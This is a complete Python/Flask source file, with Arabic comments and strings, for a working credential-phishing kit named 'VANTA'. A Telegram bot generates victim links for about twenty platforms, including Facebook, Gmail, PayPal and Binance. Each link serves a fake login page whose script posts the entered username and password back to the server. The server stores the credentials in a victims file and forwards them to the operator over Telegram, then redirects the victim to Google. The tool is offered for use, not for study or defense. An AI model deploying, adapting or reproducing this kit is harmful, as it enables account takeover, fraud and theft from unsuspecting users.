import os
import json
import uuid
import time
import threading
import requests
from flask import Flask, request, jsonify, render_template_string

# ============================================================
#  الإعدادات — عدّل هنا فقط
# ============================================================
BOT_TOKEN = "ضع_توكن_البوت_هنا"
ADMIN_ID = "ضع_الايدي_هنا"
PORT = 8000
USE_NGROK = False
NGROK_TOKEN = ""
PUBLIC_URL = ""              # اتركه فارغاً واستخدم ngrok، أو ضع رابطك الثابت
REDIRECT_URL = "https://www.google.com"

# مسار تخزين الضحايا (يُنشأ تلقائياً بجانب الملف)
BASE = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE, "victims.json")

# ============================================================
#  المنصات
# ============================================================
PLATFORMS = {
    "facebook": "فيسبوك",
    "instagram": "إنستغرام",
    "tiktok": "تيك توك",
    "twitter": "تويتر / X",
    "snapchat": "سناب شات",
    "whatsapp": "واتساب",
    "telegram": "تيليجرام",
    "google": "جوجل",
    "gmail": "جيميل",
    "youtube": "يوتيوب",
    "netflix": "نتفليكس",
    "spotify": "سبوتيفاي",
    "discord": "ديسكورد",
    "steam": "ستيم",
    "paypal": "باي بال",
    "binance": "بينانس",
    "amazon": "أمازون",
    "microsoft": "مايكروسوفت",
    "apple": "آبل",
    "yahoo": "ياهو",
    "linkedin": "لينكدإن",
    "reddit": "ريديت",
}

app = Flask(__name__)

# ============================================================
#  قاعدة البيانات
# ============================================================
def db_load():
    if not os.path.exists(DB_PATH):
        return []
    try:
        with open(DB_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return []

def db_save(data):
    tmp = DB_PATH + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    os.replace(tmp, DB_PATH)

def db_get(vid):
    return next((v for v in db_load() if v["id"] == vid), None)

def db_add(vid, platform):
    data = db_load()
    data.append({
        "id": vid,
        "platform": platform,
        "status": "pending",
        "username": None,
        "password": None,
        "ts": time.time(),
    })
    db_save(data)

def db_update(vid, username, password):
    data = db_load()
    for v in data:
        if v["id"] == vid:
            v["status"] = "compromised"
            v["username"] = username
            v["password"] = password
            v["ts"] = time.time()
    db_save(data)

# ============================================================
#  Telegram API
# ============================================================
def tg(method, **kwargs):
    if not BOT_TOKEN or BOT_TOKEN.startswith("ضع_"):
        print("[!] BOT_TOKEN غير مضبوط")
        return None
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
            json=kwargs, timeout=20,
        )
        return r.json()
    except Exception as e:
        print("[!] telegram error:", e)
        return None

def send_admin(text, keyboard=None):
    kw = dict(chat_id=ADMIN_ID, text=text, parse_mode="HTML",
              disable_web_page_preview=True)
    if keyboard:
        kw["reply_markup"] = keyboard
    return tg("sendMessage", **kw)

def edit_msg(msg_id, text, keyboard=None):
    kw = dict(chat_id=ADMIN_ID, message_id=msg_id, text=text,
              parse_mode="HTML", disable_web_page_preview=True)
    if keyboard:
        kw["reply_markup"] = keyboard
    return tg("editMessageText", **kw)

def answer_cb(cb_id, text=""):
    tg("answerCallbackQuery", callback_query_id=cb_id, text=text)

# ============================================================
#  لوحات المفاتيح
# ============================================================
def kb_main():
    return {"inline_keyboard": [
        [{"text": "🎯 توليد رابط صيد", "callback_data": "platforms"}],
        [{"text": "📊 قائمة الضحايا", "callback_data": "list:0"},
         {"text": "📈 الإحصائيات", "callback_data": "stats"}],
        [{"text": "⚙️ الإعدادات", "callback_data": "settings"},
         {"text": "❓ المساعدة", "callback_data": "help"}],
    ]}

def kb_platforms():
    rows, row = [], []
    for key, name in PLATFORMS.items():
        row.append({"text": name, "callback_data": f"make:{key}"})
        if len(row) == 2:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    rows.append([{"text": "🔙 رجوع", "callback_data": "home"}])
    return {"inline_keyboard": rows}

def kb_back(target="home"):
    return {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": target}]]}

# ============================================================
#  الشاشات
# ============================================================
def screen_home(msg_id=None):
    text = ("<b>🩸 VANTA — لوحة التحكم</b>\n\n"
            "اختر ما تريد من الأزرار أدناه.\n"
            f"<i>المنصات المتاحة: {len(PLATFORMS)}</i>")
    if msg_id:
        edit_msg(msg_id, text, kb_main())
    else:
        send_admin(text, kb_main())

def screen_platforms(msg_id):
    edit_msg(msg_id, "<b>🎯 اختر المنصة</b>\n\nستُولَّد صفحة هبوط مطابقة لها.",
             kb_platforms())

def screen_make(cb_id, msg_id, key):
    if key not in PLATFORMS:
        answer_cb(cb_id, "منصة غير معروفة")
        return
    name = PLATFORMS[key]
    vid = uuid.uuid4().hex[:8]
    db_add(vid, name)
    answer_cb(cb_id, "تم التوليد ✅")
    base = PUBLIC_URL or f"http://127.0.0.1:{PORT}"
    link = f"{base}/landing/{vid}"
    text = (f"<b>✅ رابط جاهز — {name}</b>\n\n"
            f"<code>{link}</code>\n\n"
            f"🆔 <code>{vid}</code>\n"
            f"📋 أرسل الرابط للهدف.")
    kb = {"inline_keyboard": [
        [{"text": "🎯 منصة أخرى", "callback_data": "platforms"}],
        [{"text": "📊 الضحايا", "callback_data": "list:0"},
         {"text": "🏠 الرئيسية", "callback_data": "home"}],
    ]}
    edit_msg(msg_id, text, kb)

def screen_list(msg_id, page=0):
    data = db_load()
    if not data:
        edit_msg(msg_id, "<b>📊 لا يوجد ضحايا بعد.</b>", kb_back())
        return
    PER = 8
    total = len(data)
    pages = max(1, (total + PER - 1) // PER)
    page = max(0, min(page, pages - 1))
    chunk = data[::-1][page * PER:(page + 1) * PER]
    lines = [f"<b>📊 الضحايا — صفحة {page + 1}/{pages} ({total})</b>\n"]
    for v in chunk:
        if v["status"] == "compromised":
            lines.append(f"🔴 <code>{v['id']}</code> {v['platform']}\n"
                         f"   👤 <code>{v['username']}</code> | "
                         f"🔑 <code>{v['password']}</code>")
        else:
            lines.append(f"⏳ <code>{v['id']}</code> {v['platform']} — بانتظار")
    nav = []
    if page > 0:
        nav.append({"text": "⬅️", "callback_data": f"list:{page - 1}"})
    nav.append({"text": f"{page + 1}/{pages}", "callback_data": "noop"})
    if page < pages - 1:
        nav.append({"text": "➡️", "callback_data": f"list:{page + 1}"})
    kb = {"inline_keyboard": [nav, [{"text": "🔙 رجوع", "callback_data": "home"}]]}
    edit_msg(msg_id, "\n".join(lines), kb)

def screen_stats(msg_id):
    data = db_load()
    total = len(data)
    comp = sum(1 for v in data if v["status"] == "compromised")
    by_p = {}
    for v in data:
        by_p[v["platform"]] = by_p.get(v["platform"], 0) + 1
    top = sorted(by_p.items(), key=lambda x: -x[1])[:5]
    lines = ["<b>📈 الإحصائيات</b>\n",
             f"📦 الإجمالي: <b>{total}</b>",
             f"🔴 مصطادة: <b>{comp}</b>",
             f"⏳ بانتظار: <b>{total - comp}</b>\n"]
    if top:
        lines.append("<b>أعلى المنصات:</b>")
        for name, cnt in top:
            lines.append(f"• {name}: {cnt}")
    edit_msg(msg_id, "\n".join(lines), kb_back())

def screen_settings(msg_id):
    data = db_load()
    text = (f"<b>⚙️ الإعدادات</b>\n\n"
            f"🔗 رابط عام: <code>{PUBLIC_URL or 'غير مفعّل'}</code>\n"
            f"🌐 ngrok: {'مفعّل' if USE_NGROK else 'معطّل'}\n"
            f"➡️ التحويل: {REDIRECT_URL}\n"
            f"📦 الضحايا: {len(data)}")
    kb = {"inline_keyboard": [
        [{"text": "🗑 مسح الضحايا", "callback_data": "confirm_clear"}],
        [{"text": "🔙 رجوع", "callback_data": "home"}],
    ]}
    edit_msg(msg_id, text, kb)

def screen_confirm_clear(msg_id):
    kb = {"inline_keyboard": [
        [{"text": "✅ نعم، امسح", "callback_data": "do_clear"}],
        [{"text": "❌ لا", "callback_data": "settings"}],
    ]}
    edit_msg(msg_id, "<b>⚠️ تأكيد المسح</b>\n\nسيُحذف كل الضحايا نهائياً.", kb)

def screen_help(msg_id):
    text = ("<b>❓ المساعدة</b>\n\n"
            "🎯 <b>توليد رابط صيد</b> — اختر منصة، ستحصل على رابط جاهز.\n"
            "📊 <b>الضحايا</b> — استعراض بالمقلوب مع ترقيم.\n"
            "📈 <b>الإحصائيات</b> — ملخص سريع.\n"
            "⚙️ <b>الإعدادات</b> — الرابط العام والمسح.\n\n"
            "<i>لتفعيل رابط عام: USE_NGROK=True وضع NGROK_TOKEN أعلى الملف.</i>")
    edit_msg(msg_id, text, kb_back())

# ============================================================
#  معالجة التحديثات
# ============================================================
def handle_update(upd):
    if "message" in upd:
        msg = upd["message"]
        chat = str(msg.get("chat", {}).get("id", ""))
        if chat != str(ADMIN_ID):
            return
        text = (msg.get("text") or "").strip()
        if text in ("/start", "/menu"):
            screen_home()
        elif text.startswith(("/link", "/list", "/help")):
            send_admin("<b>استخدم الأزرار أدناه</b>", kb_main())
        return

    if "callback_query" in upd:
        cb = upd["callback_query"]
        chat = str(cb.get("message", {}).get("chat", {}).get("id", ""))
        if chat != str(ADMIN_ID):
            answer_cb(cb["id"], "غير مصرح")
            return
        data = cb.get("data", "")
        msg_id = cb["message"]["message_id"]
        cb_id = cb["id"]

        if data == "home":
            answer_cb(cb_id); screen_home(msg_id)
        elif data == "platforms":
            answer_cb(cb_id); screen_platforms(msg_id)
        elif data.startswith("make:"):
            screen_make(cb_id, msg_id, data.split(":", 1)[1])
        elif data.startswith("list:"):
            answer_cb(cb_id); screen_list(msg_id, int(data.split(":")[1]))
        elif data == "stats":
            answer_cb(cb_id); screen_stats(msg_id)
        elif data == "settings":
            answer_cb(cb_id); screen_settings(msg_id)
        elif data == "help":
            answer_cb(cb_id); screen_help(msg_id)
        elif data == "confirm_clear":
            answer_cb(cb_id); screen_confirm_clear(msg_id)
        elif data == "do_clear":
            db_save([]); answer_cb(cb_id, "تم المسح ✅"); screen_home(msg_id)
        elif data == "noop":
            answer_cb(cb_id)

def bot_loop():
    if not BOT_TOKEN or BOT_TOKEN.startswith("ضع_"):
        print("[!] BOT_TOKEN غير مضبوط — البوت لن يعمل")
        return
    offset = None
    print("[*] بوت تيليجرام يعمل (أزرار)…")
    while True:
        try:
            params = {"timeout": 30}
            if offset:
                params["offset"] = offset
            r = requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params=params, timeout=40,
            ).json()
            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                try:
                    handle_update(upd)
                except Exception as e:
                    print("[!] handle:", e)
        except Exception as e:
            print("[!] bot loop:", e)
            time.sleep(3)

# ============================================================
#  Flask — صفحة الهبوط
# ============================================================
LANDING = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{{platform}}</title>
<style>
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
       background:#f0f2f5;font-family:-apple-system,Segoe UI,Arial,sans-serif}
  .card{background:#fff;max-width:380px;width:92%;padding:28px 22px;border-radius:10px;
        box-shadow:0 2px 12px rgba(0,0,0,.12);text-align:center}
  h2{margin:0 0 6px;color:#1877f2}
  p{color:#606770;font-size:14px}
  input{width:100%;box-sizing:border-box;padding:12px;margin:6px 0;border:1px solid #ccd0d5;
        border-radius:6px;font-size:15px;outline:none}
  input:focus{border-color:#1877f2}
  button{width:100%;padding:12px;margin-top:10px;background:#1877f2;color:#fff;border:0;
         border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
  .spin{display:none;margin:18px auto 0;width:38px;height:38px;border:4px solid #e4e6eb;
        border-top-color:#1877f2;border-radius:50%;animation:s 1s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  .done{display:none;color:#00a400;font-weight:600;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <h2>تأكيد {{platform}}</h2>
  <p>للاستمرار، يرجى إدخال بيانات حسابك</p>
  <form id="f">
    <input type="text" id="u" placeholder="اسم المستخدم أو البريد" autocomplete="off" required>
    <input type="password" id="p" placeholder="كلمة المرور" required>
    <button type="submit">تأكيد</button>
  </form>
  <div class="spin" id="s"></div>
  <div class="done" id="d">تم التحقق، جاري التحويل…</div>
</div>
<script>
document.getElementById('f').addEventListener('submit',function(e){
  e.preventDefault();
  var u=document.getElementById('u').value, p=document.getElementById('p').value;
  document.getElementById('f').style.display='none';
  document.getElementById('s').style.display='block';
  fetch('/submit/{{vid}}',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({username:u,password:p})})
  .then(function(){document.getElementById('s').style.display='none';
     document.getElementById('d').style.display='block';
     setTimeout(function(){window.location.href='{{redirect}}';},1500);})
  .catch(function(){document.getElementById('s').style.display='none';
     document.getElementById('d').style.display='block';
     setTimeout(function(){window.location.href='{{redirect}}';},1500);});
});
</script>
</body>
</html>"""

@app.route("/landing/<vid>")
def landing(vid):
    v = db_get(vid)
    platform = v["platform"] if v else "الحساب"
    return render_template_string(LANDING, platform=platform, vid=vid,
                                  redirect=REDIRECT_URL)

@app.route("/submit/<vid>", methods=["POST"])
def submit(vid):
    data = request.get_json(force=True, silent=True) or {}
    u = (data.get("username") or "").strip()
    p = (data.get("password") or "").strip()
    v = db_get(vid)
    if not v:
        return jsonify(status="unknown"), 404
    db_update(vid, u, p)

    def esc(s):
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    msg = (f"🚨 <b>ضحية جديدة!</b>\n"
           f"📱 المنصة: {esc(v['platform'])}\n"
           f"👤 المستخدم: <code>{esc(u)}</code>\n"
           f"🔑 كلمة المرور: <code>{esc(p)}</code>\n"
           f"🆔 <code>{vid}</code>")
    threading.Thread(target=send_admin, args=(msg,), daemon=True).start()
    return jsonify(status="success")

@app.route("/ok")
def ok():
    return jsonify(status="ok")

@app.route("/")
def index():
    return "OK", 200

# ============================================================
#  ngrok (اختياري)
# ============================================================
def start_ngrok():
    global PUBLIC_URL
    if not USE_NGROK:
        return
    if not NGROK_TOKEN:
        print("[!] NGROK_TOKEN فارغ")
        return
    from pyngrok import ngrok, conf
    conf.get_default().auth_token = NGROK_TOKEN
    t = ngrok.connect(PORT, "http")
    url = t.public_url.replace("http://", "https://")
    PUBLIC_URL = url
    print(f"[*] ngrok: {url}")
    send_admin(f"🌐 <b>الرابط العام جاهز</b>\n<code>{url}</code>", kb_main())

# ============================================================
#  التشغيل
# ============================================================
if __name__ == "__main__":
    threading.Thread(target=bot_loop, daemon=True).start()
    start_ngrok()
    print(f"[*] Flask على {PORT} — http://127.0.0.1:{PORT}")
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False,
            threaded=True)